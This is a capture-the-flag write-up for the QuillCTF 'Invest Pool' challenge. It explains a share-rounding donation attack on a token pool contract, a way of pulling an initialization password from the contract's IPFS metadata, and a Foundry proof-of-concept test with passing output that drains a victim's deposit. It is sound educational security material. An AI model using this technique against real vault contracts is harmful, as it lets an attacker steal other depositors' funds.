# QuillCTF : Invest Pool

## Object of CTF
There is a Invest Pool where a certain token is provided by users. Our goal as a hacker is to withdraw an amount of tokens higher than what we have spent on the Investment pool.

## Vulnerability Of InvestPool Smart Contract
Vulnerability of InvestPool Smart Contract is mathematical in nature rather than programatic one. In short to understand the problem we need to understand that there two main functions which are involved in deposit and withdraw of tokens in this Smart Contract and those are tokensToShare() and shareToTokens(). Diposit function uses tokensToShare() method to calculate, what is going to be the balance of user after depositing a amount of tokens to pool. Following equation shows the what this function is actully doing:

    if (poolTokenBalance > 0): user_share = amountDeposited * totalShare/poolTokenBalance
    else: userShare = amountDeposited
    
now totalShares is always increased by userShare thus it's always equal to pool Token Balance. And the balance of user is always remain equal to the amount he deposited thus **userShare** is always equal to **balance of user**.

In same way while withdrawing the tokens, it uses sharesToTokens() function which can be seen as follows:

    withdrawAmount = userBalance * poolTokenBalance/totalShares
    
Again if things remain normal, pool token balance will be equal to total shares and withdraw amount will be equal to user balance.
But here is the catch, what if a user/hacker does not use deposit() method of Smart Contract to place tokens into Smart Contract. In that case the harmony of **poolTokenBalance** and **totalShares** will be distorted as deposit() method updates totalShares along with poolTokenBalance. That's what hacker is going to use. See following steps: 

(1) Imagine hacker has **X** tokens and first he places **1 Token** using normal deposit() method. Hacker balance in Pool will be 1, totalShares will be 1 and poolTokenBalance will also be 1. Everything is normal up untill this point.

(2) Now hacker will transfer rest of the **X-1** tokens to the InvestPool smart contract using transfer() method of ERC20 tokens. At this point Pool token balance is **X** and totalShares is still just 1, since we didnt use Pool's deposit() method which updates the totalShares.

(3) Now imagine some user provides **Y** tokens to the Pool, his userShare according to Equation one will be:

    userShare = X * 1 / Y = X/Y
    (where X = userDeposited Amount, Y = Pool Token Balance, and totalShares was 1
    in last step)
    (if X < Y) userShare = 0
    after this 
    Pool Token balance = X+Y  
    totalShare = userShare + previousValue = 0 + 1 = 1.
    
As you can see userShare is going to be 0 if it's less than what hacker has provided. Thus there will be no increase in totalShares but Pool token balance is increased by Y tokens. Now if hacker withdraws his tokens. Let's see what happens according to Equation 2:

    withdrawAmount = 1 * (X+Y)/1 = X+Y
    (where userBalance in Pool is 1 and totalShare is also 1, 
    and pool token balance is (X+y) )

Thus hacker is able to withdraw X+Y tokens by just spending X tokens.

###**password for initilization**
One part of the problem was to get the password to initialize the Invest Pool Smart Contract. One can see password in Metadata url of smart contract. To see it just use tools like https://playground.sourcify.dev/ and select the Goerli network and paste Smart Contract address provided in code i.e, 0xA45aC53E355161f33fB00d3c9485C77be3c808ae . This will show you the IPFS url of Metadata, just click that url and password will show-up. Its j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx

## Proof Of Concept
### Foundry Test


    // SPDX-License-Identifier: MIT
    pragma solidity 0.8.7;
    
    import "forge-std/Test.sol";
    import "../src/poolToken.sol";
    import "../src/investPool.sol";
    
    contract Hack is Test {
        PoolToken token;
        InvestPool pool;
        address user = vm.addr(1);
        address hacker = vm.addr(2);
    
        function setUp() external {
            token = new PoolToken();
            pool = new InvestPool(address(token));
    
            token.mint(2000e18);
            token.transfer(user, 1000e18);
            token.transfer(hacker, 1000e18);
    
            vm.prank(user);
            token.approve(address(pool), type(uint).max);
    
            vm.prank(hacker);
            token.approve(address(pool), type(uint).max);
        }
    
        function userDeposit(uint amount) public {
            vm.prank(user);
            pool.deposit(amount);
            vm.stopPrank();
        }
    
        function test_hack() public {
            uint hackerBalanceBeforeHack = token.balanceOf(hacker);
    				vm.startPrank(hacker);
    
            // solution
    
            // let's first initialize the Invest Pool with the 
            // password we found in metadata ipfs url
            // i.e, j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx
    
            pool.initialize("j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx");
    
            // now as a hacker just deposit 1 token fairly using deposit()
            // function of Invest Pool
            pool.deposit(1);
    
            // now our balance in pool is 1 let's now transfer rest of the 
            // tokens to Invest Pool using ERC-20's transfer method on token
            token.transfer(address(pool), token.balanceOf(hacker));
    
            // now let's say in future some innocent user deposits
            // a million token to this pool
            vm.stopPrank();
            vm.startPrank(user);
            pool.deposit(1000000);
            vm.stopPrank();
    
            // we are now in position of withdrawing all these million tokens
            // along with our own tokens as explained in write up
            vm.startPrank(hacker);
            pool.withdrawAll();
    
    
    				vm.stopPrank();
            assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
        }
    }

	

### Foundry test output
	$ forge test --match-path test/AttackInvestPool.t.sol 
    [⠒] Compiling...
    No files changed, compilation skipped
    
    Running 1 test for test/AttackInvestPool.t.sol:Hack
    [PASS] test_hack() (gas: 119272)
    Test result: ok. 1 passed; 0 failed; finished in 1.34ms
